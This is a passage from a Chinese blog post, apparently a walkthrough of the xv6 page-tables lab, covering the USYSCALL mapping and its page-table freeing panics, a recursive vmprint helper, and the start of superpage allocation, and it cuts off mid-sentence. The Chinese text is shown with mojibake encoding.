class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// Map an read-only page at USYSCALL</span></span><br><span class="line">  <span class="type">char</span>* pa = kalloc();  <span class="comment">// alloc a pyhsical page</span></span><br><span class="line">  <span class="keyword">if</span>(pa == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// find the position to install pte</span></span><br><span class="line">  <span class="type">pte_t</span>* pte = walk(p-&gt;pagetable, USYSCALL, <span class="number">1</span>);</span><br><span class="line">  *pte = PA2PTE(pa) | PTE_V | PTE_U | PTE_R;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span>* <span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall*) pa;</span><br><span class="line">  u-&gt;pid = p-&gt;pid;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ <code>kalloc</code> è¿”å›çš„å…¶å®æ˜¯å†…æ ¸ç©ºé—´çš„è™šæ‹Ÿåœ°å€ï¼Œä½†ç”±äºå®ƒå’Œç‰©ç†å†…å­˜åœ°å€ä¸€ä¸€æ˜ å°„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç›´æ¥è¡¨ç¤ºä¸ºç‰©ç†åœ°å€ã€‚</p><p>æµ‹è¯•è§¦å‘ panic ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panic: freewalk: leaf</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª panic æ˜¯ç”± <code>kernel/vm.c</code> ä¸­çš„ <code>freewalk()</code> è§¦å‘çš„ï¼Œè¿™ä¸ªå‡½æ•°çš„è®¾è®¡å‡è®¾æ˜¯ï¼Œå®ƒè¢«è°ƒç”¨æ—¶ï¼Œä¼ å…¥çš„ Â pagetableÂ  æ•´ä¸ªéƒ½æ˜¯ç”±æŒ‡å‘æ›´ä½çº§é¡µè¡¨çš„ PTE ç»„æˆçš„ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªå®Œå…¨ç©ºçš„é¡µè¡¨ã€‚æ‰€æœ‰<strong>æ˜ å°„åˆ°ç”¨æˆ·æ•°æ®é¡µçš„å¶å­èŠ‚ç‚¹</strong>åº”è¯¥ç”±è°ƒç”¨è€…ï¼ˆæ¯”å¦‚ Â <code>uvmunmap</code>Â  æˆ– Â <code>uvmfree</code>ï¼‰æå‰å¤„ç†æ‰ã€‚</p><p>è€Œæˆ‘ä»¬å‰é¢åœ¨ Â <code>allocproc()</code> ä¸­ä¸ºæ–°è¿›ç¨‹çš„é¡µè¡¨æ·»åŠ äº†ä¸€ä¸ªæ˜ å°„åˆ° Â USYSCALLÂ  çš„<strong>å¶å­èŠ‚ç‚¹</strong>ã€‚</p><ol><li>åœ¨è¿™ä¸ªé¡µè¡¨ä¸­ä¸º Â <code>USYSCALL</code>Â  åœ°å€åˆ›å»ºäº†ä¸€ä¸ª<strong>å¶å­ PTE</strong>ï¼Œå®ƒç›´æ¥æŒ‡å‘ä¸€ä¸ªç‰©ç†æ•°æ®é¡µï¼ˆåŒ…å«äº† PIDï¼‰ã€‚</li><li>å½“è¿™ä¸ªè¿›ç¨‹é€€å‡ºæ—¶ï¼Œ<code>freeproc</code>Â  å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚</li><li><code>freeproc</code>Â  ä¼šè°ƒç”¨ Â <code>proc_freepagetable(p-&gt;pagetable)</code>ã€‚</li><li><code>proc_freepagetable</code>Â  é‡Œé¢ä¼šè°ƒç”¨ Â <code>uvmunmap</code>Â  æ¥è§£é™¤æ‰€æœ‰ç”¨æˆ·æ˜ å°„ï¼Œç„¶åè°ƒç”¨ Â <code>freewalk</code> æ¥é‡Šæ”¾ç©ºçš„é¡µè¡¨å±‚çº§ï¼ˆå³ç¬¬äºŒç¬¬ä¸‰çº§é¡µè¡¨ï¼‰ã€‚</li></ol><p>æ‰€ä»¥åœ¨é‡Šæ”¾æ•´ä¸ªé¡µè¡¨ç»“æ„ä¹‹å‰ï¼Œå¿…é¡»å…ˆè§£é™¤ï¼ˆunmapï¼‰æ‰€æœ‰æŒ‡å‘ç”¨æˆ·å†…å­˜ï¼ˆä»£ç ã€æ•°æ®ã€å †ã€æ ˆã€ä»¥åŠæ–°åŠ çš„ Â USYSCALLÂ  é¡µç­‰ï¼‰çš„æ˜ å°„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span>&#123;</span><br><span class="line">  uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, TRAPFRAME , <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// do_free = 1 è°ƒç”¨ kfree é‡Šæ”¾ USYSCALL æ˜ å°„çš„ç‰©ç†é¡µ</span></span><br><span class="line">  uvmunmap(pagetable, USYSCALL  , <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­æµ‹è¯•ï¼Œå‘ç°åˆå­˜åœ¨é—®é¢˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pgtbltest</span></span><br><span class="line">print_pgtbl starting</span><br><span class="line">...</span><br><span class="line">print_pgtbl: OK</span><br><span class="line">ugetpid_test starting</span><br><span class="line">ugetpid_test: OK</span><br><span class="line">print_kpgtbl starting</span><br><span class="line">print_kpgtbl: OK</span><br><span class="line">superpg_test starting</span><br><span class="line">pgtbltest: superpg_test failed: pte different, pid=3</span><br><span class="line">panic: uvmunmap: not mapped</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>ls</code> å‘½ä»¤ä¹Ÿä¼šè§¦å‘ <code>panic: uvmunmap: not mapped</code> ï¼Œè€Œæˆ‘ä»¬ç¡®å®åœ¨åˆ›å»ºè¿›ç¨‹æ—¶æœ‰åœ¨ USYSCALL å¤„è¿›è¡Œæ˜ å°„ï¼å›é¡¾æˆ‘ä»¬ç†è®ºçŸ¥è¯†ï¼Œshell ä¸­æ‰§è¡Œå‘½ä»¤ä¼šå…ˆ fork ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„è¿›ç¨‹ï¼Œç„¶åå†ä½¿ç”¨ exec åŠ è½½æŒ‡å®šç¨‹åºã€‚è€Œ execÂ  å‡½æ•°çš„ç¬¬ä¸€æ­¥å°±æ˜¯è¦<strong>æ¸…ç©ºå½“å‰çš„åœ°å€ç©ºé—´</strong>ï¼Œå®ƒä¼šè°ƒç”¨ Â <code>proc_freepagetable(p-&gt;pagetable, p-&gt;sz)</code>Â (å…¶ä¸­ Â pÂ  æ˜¯è¿™ä¸ªå­è¿›ç¨‹)ã€‚execÂ  ç»§ç»­æ‰§è¡Œï¼Œåˆ›å»ºä¸€ä¸ª<strong>å…¨æ–°çš„ã€ç©ºçš„é¡µè¡¨</strong>Â (é€šå¸¸åªåŒ…å«å†…æ ¸æ˜ å°„å’Œ trampoline é¡µ)ã€‚ç„¶åï¼Œå®ƒä»æŒ‡å®šç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­è¯»å–ä»£ç å’Œæ•°æ®ï¼Œå¹¶ä¸ºå®ƒä»¬åˆ†é…ç‰©ç†é¡µï¼Œå†å°†è¿™äº›é¡µæ˜ å°„åˆ°è¿™ä¸ª<strong>æ–°é¡µè¡¨</strong>ä¸­ã€‚æ­¤æ—¶åœ¨æ„å»ºçš„æ–°åœ°å€ç©ºé—´ä¸­ï¼Œ<strong>USYSCALLÂ  è¿™ä¸ªåœ°å€æ˜¯æ²¡æœ‰è¢«æ˜ å°„çš„</strong>ã€‚è€Œæœ€åç¨‹åºé€€å‡ºæ—¶åˆä¼šè°ƒç”¨ä¸€æ¬¡ <code>proc_freepagetable(p-&gt;pagetable, p-&gt;sz)</code> å¯¼è‡´ panicã€‚</p><p>æœ€ç»ˆè§£å†³æ–¹æ¡ˆä¸ºåœ¨ Â <code>proc_freepagetable</code>Â  ä¸­æ£€æŸ¥æ˜ å°„æ˜¯å¦å­˜åœ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unmap USYSCALL page if exist</span></span><br><span class="line"><span class="type">pte_t</span>* pte = walk(pagetable, USYSCALL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(pte != <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_V))</span><br><span class="line">uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h1 id="print-a-page-table"><a class="markdownIt-Anchor" href="#print-a-page-table"></a> Print a page table</h1><blockquote><p>We added a system callÂ <code>kpgtbl()</code>, which callsÂ <code>vmprint()</code>Â inÂ <code>kernel/vm.c</code>. It takes aÂ <code>pagetable_t</code>Â argument, and your job is to print that pagetable in given format. Each PTE line shows its virtual addresss, the pte bits, and the physical address extracted from the PTE.</p></blockquote><p>è¿™ä¸ªä»»åŠ¡å°±æ˜¯æŒ‰ç…§è¦æ±‚é€’å½’åœ°å»è¾“å‡ºæœ‰æ•ˆçš„é¡µè¡¨é¡¹ï¼Œä¸€å¼€å§‹åšçš„æ—¶å€™ç¬¬ä¸€ä¸ªè¾“å‡ºæ²¡çœ‹æ˜ç™½æ˜¯ä»€ä¹ˆæ„æ€ï¼Œç›´æ¥è¾“å‡ºçš„æ˜¯ PTE çš„ç‰©ç†åœ°å€ (<code>pagetable + i*8</code>)ï¼Œå®é™…ä¸Šè¾“å‡ºçš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œå³æˆ‘ä»¬éœ€è¦æ ¹æ®åœ¨æ¯ä¸€çº§é¡µè¡¨ä¸­çš„çš„åç§»é‡æ„é€ å‡ºè™šæ‹Ÿåœ°å€ã€‚</p><p>ç”±äºç»™å®šäº† <code>void vmprint(pagetable_t pagetable)</code> çš„å‡½æ•°ç­¾åï¼Œæ‰€ä»¥æ— æ³•åˆ¤æ–­é€’å½’æ·±åº¦ï¼Œä¹Ÿæ— æ³•ä¼ é€’è™šæ‹Ÿåœ°å€å‰ç¼€ï¼ˆå³ä¸Šçº§ PTE çš„åç§»é‡ï¼‰ï¼Œä¹Ÿå°±æ— æ³•åªç”¨ <code>vmprint</code> å®ç°é€’å½’è¾“å‡ºï¼Œå¼•å…¥ä¸€ä¸ªè¾…åŠ©å‡½æ•°å¾—ä»¥è§£å†³ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">print_helper</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level, uint64 prefix)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V)&#123;</span><br><span class="line">      <span class="comment">// emit invalid PTEs</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span> ; j &lt;= (<span class="number">2</span>-level); j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// va = EXT + 9(L2) + 9(L1) + 9(L0) + 12(Offset)</span></span><br><span class="line">      prefix = i &lt;&lt; (<span class="number">12</span>+level*<span class="number">9</span>) | prefix;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p: pte %p pa %p\n&quot;</span>, prefix, pte, PTE2PA(pte));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// PTE points to a lower-level page table</span></span><br><span class="line">        uint64 child = PTE2PA(pte);</span><br><span class="line">        print_helper((<span class="type">pagetable_t</span>)child, level<span class="number">-1</span>, prefix);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">  <span class="comment">// level 2 for L2 page table (aka. root table), and so on</span></span><br><span class="line">  <span class="comment">// initial virtual address prefix is 0x0</span></span><br><span class="line">  print_helper(pagetable, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/05/Lab-Page%20Tables/printpgtbl.png" alt="printpgtbl.png"></p><h1 id="use-superpages"><a class="markdownIt-Anchor" href="#use-superpages"></a> Use superpages</h1><blockquote><p>Your job is to modify the xv6 kernel to use superpages. In particular, if a user program calls <code>sbrk()</code> with a size of 2 megabytes or more, and the newly created address range includes one or more areas that are two-megabyte-aligned and at least two megabytes in size, the kernel should use a single superpage (instead of hundreds of ordinary pages).</p></blockquote><p>è¿™ä¸ªä»»åŠ¡è¦æ±‚æˆ‘ä»¬ä¸ºç”¨æˆ·è¿›ç¨‹çš„å†…å­˜åˆ†é…å¢åŠ å¯¹ Â <strong>â€œå¤§é¡µ (Superpages)â€</strong>Â  çš„æ”¯æŒã€‚å…·ä½“æ¥è¯´ï¼Œæ˜¯æ”¯æŒ 2MB å¤§å°çš„ Megapagesã€‚æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„æ ¸å¿ƒéƒ¨åˆ†æ˜¯å¤„ç† Â <code>sbrk()</code>Â  ç³»ç»Ÿè°ƒç”¨çš„å†…å­˜åˆ†é…é€»è¾‘ï¼ˆä¹Ÿå°±æ˜¯ Â <code>uvmalloc</code>Â  å‡½æ•°æˆ–å…¶ç›¸å…³éƒ¨åˆ†ï¼‰ã€‚å…¶ä¸­æˆ‘ä»¬è¦æ³¨æ„åœ°å€å¯¹é½çš„é—®é¢˜ï¼Œä¸ä»…è¦æ£€æŸ¥è™šæ‹Ÿåœ°å€æ˜¯å¦å¯¹é½ï¼Œè¿˜è¦ç¡®ä¿åˆ†é…çš„ç‰©ç†å†…å­˜ä¹Ÿæ˜¯ 2MB å¯¹é½çš„ã€‚</p><hr><p>é¦–å…ˆæ¥çœ‹çœ‹ <code>sbrk()</code> ç³»ç»Ÿè°ƒç”¨æ˜¯å¦‚ä½•åˆ†é…å†…å­˜çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;n);</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(growproc(n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">growproc</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">  uint64 sz;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  sz = p-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n, PTE_W)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sbrk()</code> æ¥æ”¶ä¸€ä¸ªå‚æ•° <code>N</code> ï¼Œä»£è¡¨äº†ç”³è¯·å¢åŠ /å‡å°‘çš„å†…å­˜å¤§å°ï¼ˆbyte ä¸ºå•ä½ï¼‰ï¼Œå…¶ä¸­è°ƒç”¨ <code>growproc()</code> è¾…åŠ©å‡½æ•°åˆ¤æ–­å†…å­˜åˆ†é…é€»è¾‘ï¼Œæœ€åçš„å…³é”®æ˜¯è°ƒç”¨ <code>uvmalloc</code> / <code>uvmdealloc</code> ã€‚</p><p>ä»¥ <code>uvmalloc()</code> ä¸ºä¾‹ç»§ç»­çœ‹å®é™…çš„åˆ†é…é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line">uint64 <span class="title function_">uvmalloc</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 oldsz, uint64 newsz, <span class="type">int</span> xperm)</span>&#123;</span><br><span class="line">  <span class="type">char</span> *mem;</span><br><span class="line">  uint64 a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(newsz &lt; oldsz)</span><br><span class="line">    <span class="keyword">return</span> oldsz;</span><br><span class="line"></span><br><span class="line">  oldsz = PGROUNDUP(oldsz);</span><br><span class="line">  <span class="keyword">for</span>(a = oldsz; a &lt; newsz; a += PGSIZE)&#123;</span><br><span class="line">    mem = kalloc();       <span class="comment">// kallocä»å†…æ ¸ç”³è¯·ç©ºé—²ç‰©ç†é¡µ</span></span><br><span class="line">    <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">      uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">    <span class="comment">// è™šæ‹Ÿåœ°å€aä¸ç”³è¯·çš„ç‰©ç†é¡µè¿›è¡Œæ˜ å°„ï¼Œæ·»åŠ åˆ°é¡µè¡¨ä¸­ï¼Œ</span></span><br><span class="line">    <span class="comment">// ä»è€Œå®ç°å†…å­˜å¢é•¿</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(pagetable, a, PGSIZE, (uint64)mem, PTE_R|PTE_U|xperm) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// walkæ— æ³•åˆ†é…ä¸€ä¸ªé¡µè¡¨é¡µ</span></span><br><span class="line">      kfree(mem);</span><br><span class="line">      uvmdealloc(pagetable, a, oldsz);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°è¿™é‡ŒæŠŠ <code>oldsz</code> å’Œ <code>newsz</code> å½“ä½œäº†è™šæ‹Ÿåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>p-&gt;sz</code> ä¸ä»…è¡¨ç¤ºçš„æ˜¯è¿›ç¨‹å ç”¨çš„å†…å­˜å¤§å°ï¼ŒåŒæ—¶ä¹Ÿè¡¨ç¤ºäº†ä¸€ä¸ªå‘ä¸Šå¢é•¿çš„è™šæ‹Ÿåœ°å€çš„è¾¹ç•Œï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p><p>æˆ‘ä»¬å›é¡¾è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†å¸ƒï¼Œå¯ä»¥çŸ¥é“ <code>p-&gt;sz</code> å…¶å®ä¹Ÿæ˜¯<strong>å †é¡¶çš„è™šæ‹Ÿåœ°å€ï¼ˆè¾¹ç•Œï¼‰</strong>ã€‚å®é™…ä¸Š<code>sbrk()</code> æ˜¯ <code>malloc()</code> çš„ä¸‹å±‚è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´é€šè¿‡å®ƒç”³è¯·çš„æ˜¯<strong>è¿è¡Œæ—¶</strong>å †å†…å­˜ï¼Œè€Œå…¶ä»–éƒ¨åˆ†å¦‚ä»£ç æ®µ textï¼Œæ•°æ®æ®µ data æˆ–æ ˆ stack éƒ½æ˜¯åœ¨<strong>è¿›ç¨‹åˆ›å»ºæ—¶</strong>å°±ç¡®å®šäº†ã€‚è€Œä¸”ä¸€ä¸ªè¿›ç¨‹å®é™…å ç”¨çš„æ€»ç‰©ç†å†…å­˜<strong>ä¸æ˜¯</strong>Â p-&gt;szï¼Œè€Œæ˜¯çº¦ç­‰äº Â p-&gt;szÂ (text+data+heap) +Â PGSIZEÂ (stack) +Â PGSIZEÂ (guard page, å¦‚æœæ˜ å°„çš„è¯) +Â PGSIZEÂ (trapframe) +Â PGSIZEÂ (trampoline)ã€‚</p><p>æœ€ç»ˆæˆ‘ä»¬ç”±ä¸Šè‡³ä¸‹æ¥æ€»ç»“å†…å­˜ç”³è¯·çš„å…·ä½“é€»è¾‘ï¼š<code>malloc (ulibc)</code> --&gt; <code>sbrk (syscallå°è£…)</code> -user-|-kernel-&gt; <code>sys_sbrk (kernelå®ç°)</code> -&gt; <code>growproc (helper func)</code> -&gt; <code>uvmalloc/uvmdealloc (åº•å±‚åˆ†é…é€»è¾‘)</code></p><hr><p>æ•´ä¸ªä»»åŠ¡ç”±åº•å±‚å‘ä¸Šå¯ä»¥åˆ†è§£ä¸ºä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š<strong>ç‰©ç†å†…å­˜ç®¡ç†</strong>ã€<strong>è™šæ‹Ÿå†…å­˜æ˜ å°„</strong>å’Œ<strong>è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼Œç›®çš„æ—¶å®ç° xv6 æ”¯æŒ superpage å¤§é¡µã€‚</p><h2 id="1-ç‰©ç†å†…å­˜ç®¡ç†"><a class="markdownIt-Anchor" href="#1-ç‰©ç†å†…å­˜ç®¡ç†"></a> 1. ç‰©ç†å†…å­˜ç®¡ç†</h2><blockquote><p>Your kernel will need to be able to <strong>allocate and free</strong> two-megabyte regions. Modify <code>kalloc.c</code> to <strong>set aside a few two-megabyte areas of physical memory</strong>, and create <code>superalloc()</code> and <code>superfree()</code> functions. Youâ€™ll only need a handful of two-megabyte chunks of memory.</p></blockquote><p>åœ¨æˆ‘ä»¬èƒ½å¤Ÿæ˜ å°„ä¸€ä¸ª 2MB çš„å¤§é¡µä¹‹å‰ï¼Œå¿…é¡»å¾—å…ˆæœ‰ä¸€ä¸ª 2MB å¤§å°ã€2MB å¯¹é½çš„<strong>ç‰©ç†å†…å­˜å—</strong>ã€‚ç„¶è€Œæ ‡å‡†çš„ Â <code>kalloc()</code>Â  ä¸€æ¬¡åªåˆ†é… 4KB çš„å°é¡µï¼Œå¹¶ä¸”ä¸ä¿è¯ 2MB åœ°å€å¯¹é½ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±å®ç°ä¸€å¥—å†…å­˜åˆ†é…ä¸ç®¡ç†çš„æœºåˆ¶æ¥æ”¯æŒ superpage ã€‚</p><p>å†…æ ¸åˆå§‹åŒ–æ—¶è°ƒç”¨ Â <code>kinit()</code>Â  å‡½æ•° (<code>kernel/kalloc.c</code>) æ¥åˆå§‹åŒ–ç‰©ç†å†…å­˜ï¼Œå®ƒä¼šæŠŠæŠŠæ‰€æœ‰å¯ç”¨å†…å­˜ä¸€é¡µä¸€é¡µï¼ˆ4KBï¼‰åœ°é€šè¿‡ Â <code>kfree()</code>Â  æ·»åŠ åˆ°ç©ºé—²é“¾è¡¨é‡Œæ—¶ï¼Œè¿™é‡Œä¿è¯çš„æ˜¯ 4KB çš„å¯¹é½ã€‚å¯¹äºå¤§é¡µæ¥è¯´æˆ‘ä»¬éœ€è¦å¦ä¸€ä¸ª freelist æ¥ä¿å­˜ç©ºé—²çš„ 2MB å¯¹é½çš„å¤§é¡µã€‚</p><p>å› æ­¤åˆå§‹åŒ–é˜¶æ®µæˆ‘ä»¬éå†ä» Â <code>end</code>Â  åˆ° Â <code>PHYSTOP</code>Â  çš„ç‰©ç†å†…å­˜ï¼Œå½“é‡åˆ°ä¸€ä¸ª 2MB å¯¹é½çš„ç‰©ç†åœ°å€æ—¶ï¼Œä¸è¦æŠŠå®ƒåˆ†æˆ 512 ä¸ª 4KB å°é¡µåŠ å…¥æ™®é€šç©ºé—²é“¾è¡¨ï¼Œè€Œæ˜¯<strong>æŠŠè¿™æ•´ä¸ª 2MB çš„å—åœ°å€è®°å½•ä¸‹æ¥ï¼Œç”¨äºå¤§é¡µåˆ†é…</strong>ã€‚åŒæ—¶<strong>æ³¨æ„ä¸èƒ½æŠŠå‰©ä½™çš„æ‰€æœ‰å†…å­˜éƒ½åˆ’å…¥å¤§é¡µé“¾è¡¨</strong>ä¸­ï¼šç³»ç»Ÿå¤§éƒ¨åˆ†æ—¶é—´åªéœ€è¦åˆ†é… 4KB çš„å°é¡µï¼ˆæ¯”å¦‚ç”¨äºé¡µè¡¨ã€å°çš„ Â <code>sbrk</code>Â  è¯·æ±‚ã€å†…æ ¸æ ˆç­‰ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬å°†æ‰€æœ‰å¯¹é½çš„å†…å­˜éƒ½å˜æˆå¤§é¡µåˆ™å¯èƒ½ä¼šå¯¼è‡´æ™®é€šçš„å°é¡µæ±  (<code>kmem.freelist</code>) 